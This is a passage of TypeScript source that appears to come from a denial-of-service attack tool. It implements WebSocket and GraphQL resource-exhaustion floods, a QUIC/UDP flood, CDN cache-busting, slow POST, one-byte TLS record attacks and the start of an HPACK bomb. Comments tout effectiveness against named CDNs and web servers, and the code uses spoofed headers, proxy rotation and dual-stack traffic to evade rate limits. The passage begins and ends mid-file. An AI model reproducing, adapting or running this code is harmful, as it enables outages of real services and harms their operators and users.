  onStats: (p: number, b: number, c?: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const MAX_CONNS = !IS_PROD ? Math.min(threads * 4, 400) : Math.min(threads * 15, 5000); // 5K WS × 40KB = 200MB per worker
  const useHttps  = targetPort === 443;

  const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
                     "/stream", "/events", "/push", "/realtime", "/notify", "/feed", "/"];
  // WebSocket ping frame: FIN=1, opcode=0x9 (ping), no mask, length=0
  const PING_FRAME = Buffer.from([0x89, 0x00]);

  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");

  const oneWs = async (): Promise<void> => {
    if (signal.aborted) return;

    const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
    const key    = wsKey();
    const req = [
      `GET ${path} HTTP/1.1`,
      `Host: ${hostname}`,
      `Upgrade: websocket`,
      `Connection: Upgrade`,
      `Sec-WebSocket-Key: ${key}`,
      `Sec-WebSocket-Version: 13`,
      `Origin: https://${hostname}`,
      `User-Agent: ${randUA()}`,
      `Cache-Control: no-cache`,
      `X-Forwarded-For: ${randIp()}`,
      ``, ``,
    ].join("\r\n");

    let sock: net.Socket;
    if (useHttps) {
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    return new Promise<void>(resolve => {

    sock.setTimeout(130_000);

    let upgraded = false, settled = false, pingIv: NodeJS.Timeout | null = null;
    let respBuf  = "";
    const done = () => {
      if (!settled) {
        settled = true;
        if (upgraded) activeConns = Math.max(0, activeConns - 1);
        if (pingIv) { clearInterval(pingIv); pingIv = null; }
        resolve();
      }
    };

    const onConnect = () => {
      sock.write(req);
      localPkts++; localBytes += req.length;
    };
    if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
    else sock.once("connect", onConnect);

    sock.on("data", (data: Buffer) => {
      if (!upgraded) {
        respBuf += data.toString("ascii");
        if (respBuf.includes("101")) {
          upgraded = true; activeConns++;
          localPkts++; localBytes += 200;

          // ★ v3 WebSocket Amplification: send subscription registration immediately
          // GraphQL-over-WS: server allocates subscription state + data fetcher goroutine per sub
          const GQL_TYPES = ["users","posts","comments","orders","notifications","messages","events","feeds"];
          const gqlSubs = [
            `{"type":"connection_init","payload":{}}`,
            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{${GQL_TYPES[randInt(0,GQL_TYPES.length)]}Updated{id name createdAt data}}"}}`,
            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{onMessage{id body from to timestamp}}"}}`,
          ];
          // STOMP-style subscription (works on Spring/ActiveMQ backends)
          const stompSub = `SUBSCRIBE\ndestination:/topic/${randStr(8)}\nid:sub-${randStr(4)}\n\n\x00`;
          // Socket.io subscription
          const sioSub = `42["subscribe","${GQL_TYPES[randInt(0,GQL_TYPES.length)]}","*"]`;

          // Send initial subscription messages
          for (const msg of gqlSubs) {
            const encoded = Buffer.from(msg, "utf8");
            const len = encoded.length;
            const hdr = len < 126
              ? Buffer.from([0x81, len])
              : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
            try { sock.write(Buffer.concat([hdr, encoded])); localPkts++; localBytes += hdr.length + len; } catch { /**/ }
          }
          // Also try STOMP and Socket.io
          for (const msg of [stompSub, sioSub]) {
            const encoded = Buffer.from(msg, "utf8");
            const len = encoded.length;
            const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
            try { sock.write(Buffer.concat([hdr, encoded])); } catch { /**/ }
          }

          // ★ HIGH-FREQUENCY frame storm: 800ms interval (was 8000ms — 10× more aggressive)
          // Each frame: server must parse WS frame header + allocate message buffer + process
          // At 800ms × 1000 conns = 1250 server-side parse+alloc operations/sec
          pingIv = setInterval(() => {
            if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
            try {
              const r = Math.random();
              if (r < 0.30) {
                // Large binary frame (16KB–128KB) — forces server buffer alloc + message parse
                const frameSize = randInt(16384, 131072);
                const frameHdr  = Buffer.from([0x82, 127,
                  0, 0, 0, 0,
                  (frameSize >> 24) & 0xff, (frameSize >> 16) & 0xff,
                  (frameSize >> 8)  & 0xff,  frameSize         & 0xff,
                ]);
                const payload = Buffer.allocUnsafe(frameSize);
                for (let i = 0; i + 4 <= frameSize; i += 4)
                  payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
                sock.write(Buffer.concat([frameHdr, payload]));
                localPkts++; localBytes += frameHdr.length + frameSize;
              } else if (r < 0.60) {
                // GraphQL subscription message — forces server-side subscription resolver
                const sub = gqlSubs[randInt(1, gqlSubs.length)];
                const encoded = Buffer.from(sub, "utf8");
                const len = encoded.length;
                const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
                sock.write(Buffer.concat([hdr, encoded]));
                localPkts++; localBytes += hdr.length + len;
              } else {
                // PING frame — server must ACK each one
                sock.write(PING_FRAME); localPkts++; localBytes += 2;
              }
            }
            catch { done(); }
          }, 800); // ★ 800ms (was 8000ms) — 10× amplification factor
        } else if (respBuf.length > 8192) {
          // Not a WS path — outer while-loop will try a different path automatically
          sock.destroy(); done(); return;
        }
      }
    });

    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneWs

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneWs();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONNS }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GRAPHQL INTROSPECTION DoS
//
//  Sends deeply nested GraphQL queries that cause exponential resolver CPU.
//  A 15-level nested query with aliases can multiply O(1) resolvers into O(N^15).
//  Also sends batched introspection queries (__schema traversal is expensive).
//
//  Targets: /graphql, /api/graphql, /api/v1/graphql, /query, /gql, etc.
//  Works best against unprotected GraphQL APIs (no query depth limit or cost limit).
// ─────────────────────────────────────────────────────────────────────────
async function runGraphQLDoS(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const ENDPOINTS = [
    "/graphql", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
    "/graphql/v1", "/query", "/api/query", "/gql", "/v1/graphql",
    "/admin/graphql", "/graphql/playground", "/api/v3/graphql",
  ];

  // Build deeply nested query — exponential resolver complexity
  const TYPES  = ["user", "post", "comment", "author", "likes", "followers", "following", "product", "order"];
  const FIELDS = ["id", "name", "email", "title", "body", "content", "createdAt", "updatedAt", "slug"];
  const buildNested = (depth = randInt(8, 16)): string => {
    let q = "{ ", close = "";
    for (let i = 0; i < depth; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      const f = FIELDS[randInt(0, FIELDS.length)];
      q     += `${t}(id: ${randInt(1, 999999)}) { ${f} `;
      close += " }";
    }
    return q + close + " }";
  };

  // Introspection: forces full schema traversal (expensive type resolution)
  const INTROSPECTION = `{ __schema { types { name description fields { name description type {
    name kind ofType { name kind ofType { name kind ofType { name kind } } } }
    args { name description type { name kind } } } }
    directives { name description locations } } }`;

  // Alias bombing: many aliases for the same expensive field in one request
  const buildAliasBomb = (count = randInt(30, 100)): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    const aliases = Array.from({ length: count },
      (_, i) => `a${i}: ${t}(id: ${randInt(1, 999999)}) { id name }`
    ).join(" ");
    return `{ ${aliases} }`;
  };

  // Fragment bomb: deeply-branching non-circular fragment definitions
  // Forces the server to resolve each fragment against the schema (expensive type checking),
  // build a merged selection set, and execute all fields — O(fragments × fields) per request.
  const buildFragmentBomb = (fragCount = randInt(20, 60)): string => {
    const frags: string[] = [];
    for (let i = 0; i < fragCount; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      // Each fragment spreads multiple fields — creates a wide selection set
      const fields = Array.from({ length: randInt(3, 10) },
        () => FIELDS[randInt(0, FIELDS.length)]
      ).join(" ");
      // Spread the previous fragment (if any) to chain them — forces recursive resolution
      const spread = i > 0 && Math.random() < 0.7 ? `...frag${i - 1}` : "";
      frags.push(`fragment frag${i} on ${t.charAt(0).toUpperCase() + t.slice(1)} { ${fields} ${spread} }`);
    }
    const t = TYPES[randInt(0, TYPES.length)];
    // Query uses all fragments in aliases — maximises resolver calls
    const aliases = frags.map((_, i) =>
      `a${i}: ${t}(id: ${randInt(1, 9999)}) { ...frag${i} }`
    ).join(" ");
    return frags.join("\n") + `\nquery Q { ${aliases} }`;
  };

  // ★ Mutation flood — writes are far more expensive than reads (lock acquisition + DB write)
  const buildMutationFlood = (count = randInt(20, 60)): string => {
    const ops = Array.from({ length: count }, (_, i) => {
      const t = TYPES[randInt(0, TYPES.length)];
      const T = t.charAt(0).toUpperCase() + t.slice(1);
      return `m${i}: update${T}(input:{id:${randInt(1,999999)},data:"${randStr(32)}",ts:${Date.now()}}) { id ${FIELDS[randInt(0,FIELDS.length)]} }`;
    }).join(" ");
    return `mutation M { ${ops} }`;
  };

  // ★ Directive bomb — many @skip/@include directives force per-field directive evaluation
  const buildDirectiveBomb = (): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    const fields = FIELDS.map(f =>
      `${f} @skip(if: ${Math.random() < 0.5}) @include(if: ${Math.random() < 0.5})`
    ).join(" ");
    return `{ ${t}(id: ${randInt(1,999999)}) { ${fields} } }`;
  };

  // ★ Subscription request — server allocates long-lived subscription state per request
  const buildSubscriptionBomb = (): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    return `subscription S { ${t}Changed(filter:{id:${randInt(1,999999)}}) { id ${FIELDS.slice(0,4).join(" ")} } }`;
  };

  // Batched array — v3: 20–80 operations (was 5–25) = 3–4× more server computation per request
  const buildBatch = (size = randInt(20, 80)): string => {
    const ops = Array.from({ length: size }, () => {
      const r = Math.random();
      const q = r < 0.15 ? buildMutationFlood(5)
              : r < 0.30 ? buildDirectiveBomb()
              : r < 0.45 ? buildFragmentBomb()
              : r < 0.65 ? buildAliasBomb()
              : r < 0.80 ? buildSubscriptionBomb()
              : buildNested(randInt(10, 20));
      return { query: q, variables: {} };
    });
    return JSON.stringify(ops);
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const baseUrl  = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;
  let   proxyIdx = 0;

  const GQL_HEADERS = (body: string): Record<string, string> => ({
    "Content-Type":    "application/json",
    "Content-Length":  String(Buffer.byteLength(body)),
    "User-Agent":      randUA(),
    "X-Forwarded-For": randIp(),
    "X-Real-IP":       randIp(),
    "Accept":          "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control":   "no-cache",
    "Pragma":          "no-cache",
    "X-Request-ID":    randHex(16),
    "Origin":          baseUrl,
    "Referer":         baseUrl + "/",
  });

  const runThread = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const endpoint = ENDPOINTS[randInt(0, ENDPOINTS.length)];
        const url      = baseUrl + endpoint;

        const r        = Math.random();
        const isIntro  = r < 0.15;
        const isFrag   = r < 0.35;
        const isBatch  = r < 0.60;
        const body     = isIntro
          ? JSON.stringify({ query: INTROSPECTION })
          : isFrag  ? JSON.stringify({ query: buildFragmentBomb() })
          : isBatch ? buildBatch()
          : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });

        const headers = GQL_HEADERS(body);

        // Route through proxy when available (95% of requests)
        if (proxies.length > 0 && Math.random() < 0.95) {
          const proxy = pickProxy(proxies);
          try {
            const bytes = await fetchViaProxy(url, proxy, "POST", headers, body);
            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
          if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
          continue;
        }

        const ac    = new AbortController();
        const timer = setTimeout(() => ac.abort(), 12_000);
        try {
          await fetch(url, {
            method:  "POST",
            signal:  ac.signal,
            headers,
            body,
          });
          clearTimeout(timer);
          localPkts++; localBytes += body.length + 200;
        } catch { clearTimeout(timer); }
      } catch { /* swallow */ }
      // Tiny yield to avoid monopolising the event loop
      if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
    }
  };

  await Promise.all(Array.from({ length: Math.min(threads, 2000) }, () => runThread())); // 32GB: 2K HPACK bombs × 100KB = 200MB
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  QUIC / HTTP3 FLOOD
//
//  Sends UDP packets with QUIC Long Header + CRYPTO frame (RFC 9000).
//  Each packet looks like a QUIC Initial — server allocates state per
//  unique DCID, consumes CPU for header protection + decryption attempt.
//  Targets port 443/UDP on HTTP/3-capable servers. Falls back to raw UDP
//  flood for non-QUIC targets. Random DCIDs prevent dedup.
// ─────────────────────────────────────────────────────────────────────────
async function runQUICFlood(
  resolvedHost: string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  ip6?:         string | null, // IPv6 for dual-stack flooding
): Promise<void> {
  // Deployed (32GB): 128 UDP sockets, 4K inflight; non-deployed prod: 64 sockets, 2K inflight
  // Dual-stack: even sockets → udp4/IPv4, odd sockets → udp6/IPv6 (if ip6 provided)
  const NUM_SOCKS = !IS_PROD ? Math.min(threads, 8) : IS_DEPLOYED ? Math.min(threads, 128) : Math.min(threads, 64);
  const INFLIGHT  = !IS_PROD ? 200 : IS_DEPLOYED ? 4000 : 2000;
  const PKTSIZE   = 1200; // QUIC minimum MTU

  const makeQUICInitial = (): Buffer => {
    const dcidLen = 8 + (Math.random() * 12 | 0);
    const scidLen = 8;
    const dcid = Buffer.allocUnsafe(dcidLen);
    const scid = Buffer.allocUnsafe(scidLen);
    for (let i = 0; i < dcidLen; i++) dcid[i] = Math.random() * 256 | 0;
    for (let i = 0; i < scidLen; i++) scid[i] = Math.random() * 256 | 0;
    const hdr = Buffer.allocUnsafe(7 + dcidLen + scidLen);
    let off = 0;
    hdr[off++] = 0xC0 | (Math.random() * 4 | 0);  // Long Header | Initial
    hdr.writeUInt32BE(0x00000001, off); off += 4;   // QUIC v1
    hdr[off++] = dcidLen;
    dcid.copy(hdr, off); off += dcidLen;
    hdr[off++] = scidLen;
    scid.copy(hdr, off);
    // CRYPTO frame payload (fake ClientHello bytes)
    const payload = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - 6));
    payload[0] = 0x06; // CRYPTO frame type
    payload[1] = 0x00; payload[2] = 0x00; // offset = 0
    payload.writeUInt16BE(payload.length - 4, 3); // length field
    for (let i = 4; i < payload.length; i++) payload[i] = Math.random() * 256 | 0;
    return Buffer.concat([hdr, Buffer.from([0x00, 0x01]), payload]); // pkt num + payload
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const pending: Promise<void>[] = [];
  for (let i = 0; i < NUM_SOCKS; i++) {
    // Dual-stack: alternate between IPv4 and IPv6 sockets when IPv6 is available.
    // CDNs like Cloudflare, Fastly, and Akamai have separate rate-limit pools per
    // IP version — saturating both simultaneously halves the effectiveness of any
    // per-IP rate limiting that only applies to one address family.
    const useV6   = ip6 ? i % 2 === 1 : false;
    const target6 = useV6 ? ip6! : resolvedHost;
    const s = dgram.createSocket(useV6 ? "udp6" : "udp4");
    pending.push(new Promise<void>(resolve => {
      if (signal.aborted) { resolve(); return; }
      let inflight = 0;
      let reschedPending = false;
      const send = () => {
        reschedPending = false;
        if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
        while (inflight < INFLIGHT) {
          inflight++;
          const pkt = makeQUICInitial();
          s.send(pkt, 0, pkt.length, targetPort, target6, (err) => {
            inflight--;
            if (!err) { localPkts++; localBytes += pkt.length; }
            if (signal.aborted) {
              if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
            } else if (!reschedPending) {
              reschedPending = true;
              setImmediate(send);
            }
          });
        }
      };
      s.on("error", () => { resolve(); });
      send();
      signal.addEventListener("abort", () => {
        if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
      }, { once: true });
    }));
  }

  await Promise.all(pending);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CACHE POISONING DoS
//
//  Poisons CDN/reverse-proxy cache with requests that generate unique
//  cache keys → evicts legitimate content, forces origin miss rate to 100%.
//  Techniques:
//    1. Random bust params → each request = new cache entry
//    2. X-Forwarded-Host / X-Original-URL → host-keyed cache pollution
//    3. Range: bytes=N-M → partial-content fragments fill object store
//    4. Fake CF-Connecting-IP → IP-keyed cache segmentation
//    5. Vary-intensive headers → multiplies entries per resource URL
//  Effective against: Cloudflare, Fastly, Akamai, Varnish, Nginx proxy_cache
// ─────────────────────────────────────────────────────────────────────────
async function runCachePoison(
  base:    string,
  threads: number,
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  // Deployed (32GB): 3000 CDN-busting slots; non-deployed: 1500; dev: 80
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : IS_DEPLOYED ? Math.min(threads, 3000) : Math.min(threads, 1500);

  const rand    = (n: number) => Math.random() * n | 0;
  const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
  const rIP     = () => `${rand(256)}.${rand(256)}.${rand(256)}.${rand(256)}`;
  const rBytes  = () => `bytes=${rand(10000)}-${rand(10000) + rand(1000)}`;
  let   pIdx    = 0;

  const POISONS: Array<() => Record<string, string>> = [
    () => ({ "X-Forwarded-Host": `${rHex(8)}.evil.null`, "X-Host": `${rHex(6)}.cdn.void` }),
    () => ({ "X-Original-URL": `/${rHex(4)}/admin/${rHex(6)}`, "X-Rewrite-URL": `/secret/${rHex(4)}` }),
    () => ({ "Accept-Encoding": ["br", "zstd", "identity", "gzip, br"][rand(4)] }),
    () => ({ "Range": rBytes(), "If-Range": new Date(Date.now() - rand(86400000)).toUTCString() }),
    () => ({ "Cookie": `buster=${rHex(16)}; sid=${rHex(32)}; track=${rHex(8)}` }),
    () => ({ "CF-Connecting-IP": rIP(), "True-Client-IP": rIP(), "X-Real-IP": rIP() }),
    () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
    () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
    // Next.js RSC cache segmentation — each unique RSC header = separate Cloudflare cache entry
    // Cloudflare Vary: RSC → each value forks the cache key, multiplying storage demand
    () => ({ "RSC": "1", "Next-Router-Prefetch": "1", "Next-Router-State-Tree": `%5B%22${rHex(8)}%22%5D` }),
    () => ({ "RSC": "1", "Next-Router-Segment-Prefetch": rHex(12), "Next-Url": `/${rHex(6)}` }),
    () => ({ "Next-Router-State-Tree": `%5B%22${rHex(16)}%22%2C%22${rHex(8)}%22%5D` }),
    // Cloudflare workers / edge cache segmentation via device type
    () => ({ "CF-Device-Type": ["desktop","mobile","tablet"][rand(3)], "Save-Data": rand(2) ? "on" : "off" }),
  ];
  const PATHS = [
    "/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q=",
    // Next.js RSC paths — each unique _rsc value = fresh CDN key (bypasses all edge caching)
    "/?_rsc=", "/?RSC=1&_=", "/?_rsc=prefetch&id=", "/?_rsc=full&v=",
    "/_next/data/", "/_next/image?url=%2F&w=", "/_next/static/chunks/",
  ];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const loop = async () => {
      while (!signal.aborted) {
        const poison = POISONS[rand(POISONS.length)]();
        const path   = PATHS[rand(PATHS.length)];
        const url    = `${base}${path}${rHex(8)}`;
        const hdrs: Record<string, string> = {
          "User-Agent":    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${120 + rand(15)}.0.0.0 Safari/537.36`,
          "Accept":        "text/html,application/xhtml+xml,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          "Cache-Control": "no-store, no-cache, must-revalidate",
          "Pragma":        "no-cache",
          "X-Request-ID":  rHex(16),
          ...poison,
        };
        // Route through proxy (95% when available) — each request from different IP = different cache key
        if (proxies.length > 0 && Math.random() < 0.95) {
          const proxy = pickProxy(proxies);
          try {
            const bytes = await fetchViaProxy(url, proxy, "GET", hdrs);
            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
          continue;
        }
        try {
          const ac   = new AbortController();
          const t    = setTimeout(() => ac.abort(), 8_000);
          const res  = await fetch(url, { method: "GET", signal: ac.signal, headers: hdrs });
          clearTimeout(t);
          const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
          localPkts++;
          localBytes += body.byteLength || 500;
        } catch { /* absorb */ }
      }
      resolve();
    };
    loop();
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  RUDY v2 — Multipart Slow POST
//
//  Enhanced R.U.D.Y using multipart/form-data with a 512-byte boundary.
//  Server must buffer the entire body waiting for the closing --BOUNDARY--
//  that never arrives. Trickling 1 byte every SEND_MS keeps the thread
//  allocated. Harder to detect than plain R.U.D.Y (content-type differs).
//  DEV: 60 slots | PROD: 800 slots
// ─────────────────────────────────────────────────────────────────────────
async function runRUDYv2(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
  const SEND_MS   = 5_000;

  const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  const BOUNDARY = Array.from({ length: 70 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");

  let openConns = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    // Use mkTLSSock for proxy rotation — each RUDY connection comes from a different IP
    const sock = await mkTLSSock(proxies.length > 0 ? proxies : [], pIdx++, resolvedHost, hostname, targetPort)
      .catch(() => null);
    if (!sock || signal.aborted) return;

    const reqLine = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
    const partHdr = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;

    return new Promise<void>(resolve => {
      sock.setTimeout(120_000);
      const startData = () => {
        openConns++;
        sock.write(reqLine + partHdr);
        localPkts++; localBytes += reqLine.length + partHdr.length;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); return; }
          try { sock.write(Buffer.from([65 + (Math.random() * 26 | 0)])); localPkts++; localBytes += 1; }
          catch { clearInterval(iv); }
        }, SEND_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); try { sock.destroy(); } catch { /**/ } }, { once: true });
      };

      if ((sock as tls.TLSSocket).authorized !== undefined) {
        // Already connected TLS socket from mkTLSSock
        startData();
      } else {
        (sock as net.Socket).once("connect", startData);
      }

      const onEnd = () => {
        openConns = Math.max(0, openConns - 1);
        resolve();
      };
      sock.on("error",   onEnd);
      sock.on("close",   onEnd);
      sock.on("timeout", () => { try { sock.destroy(); } catch { /**/ } });
    });
  };

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 100 + Math.random() * 200));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SSL DEATH RECORD
//
//  After TLS handshake, writes application data one byte at a time.
//  Node's TLS stack creates a separate TLS record per write(), forcing
//  the server to AES-GCM decrypt + MAC-verify each 1-byte record.
//  200 connections × 100 records/sec = 20,000 decrypt ops/sec on server.
//  Works against TLS 1.2 AND TLS 1.3. Saturates server crypto threads.
// ─────────────────────────────────────────────────────────────────────────
async function runSSLDeathRecord(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
  const RATE_MS   = 10; // 100 records/sec per slot

  let openConns = 0, pIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort);
    sock.setTimeout(60_000);
    return new Promise<void>(resolve => {
      let settled = false;
      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); resolve(); } };

      sock.once("secureConnect", () => {
        openConns++;
        // Partial HTTP/1.1 request sent as 1-byte TLS records → forces slow reassembly
        const req = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n`;
        let pos = 0;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); done(); return; }
          const byte = pos < req.length
            ? Buffer.from([req.charCodeAt(pos++)])
            : Buffer.from([Math.random() * 256 | 0]);
          try {
            sock.write(byte);
            localPkts++;
            localBytes += 22; // 1 payload + 5 TLS hdr + 16 AES-GCM tag (server cost)
          } catch { clearInterval(iv); done(); }
        }, RATE_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); done(); }, { once: true });
      });

      sock.on("data",    () => {});
      sock.on("error",   () => { done(); });
      sock.on("close",   () => { done(); });
      sock.on("timeout", () => { sock.destroy(); done(); });
    });
  };

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 150));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HPACK BOMB — HTTP/2 dynamic table exhaustion
//
//  Sends HEADERS frames packed with 50–150 unique custom headers, each
//  carrying the "Literal Header Field with Incremental Indexing" flag
//  (HPACK type 0x40 — RFC 7541 §6.2.1). This forces the server to:
//    1. Parse each header name + value pair
//    2. Compute a hash / compare against its HPACK dynamic table
//    3. Insert the new entry (evicting oldest when table exceeds maxSize)
//
//  The server's HPACK dynamic table is bounded (default 64KB). As we
//  send hundreds of headers per stream, the server continuously adds
//  new entries and evicts old ones — a tight allocator + GC cycle per
//  stream, per connection. Unlike the CONTINUATION flood (CVE-2024-27316)
//  this targets *properly patched* servers — there is no fix because
//  HPACK incremental indexing is a required protocol feature.
//
//  Effect: 500 connections × 200 streams/sec × 100 headers = 10M HPACK
//  table operations/sec on server CPU. Effective against nginx, h2o,
//  Envoy, Cloudflare Workers, AWS ALB, Caddy.
// ─────────────────────────────────────────────────────────────────────────
async function runHPACKBomb(
  resolvedHost: string,
  hostname:    string,
  targetPort:  number,
  threads:     number,
  signal:      AbortSignal,
  onStats:     (p: number, b: number) => void,
  proxies:     ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections

  // Raw H2 frame builder (identical layout to h2-continuation)
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
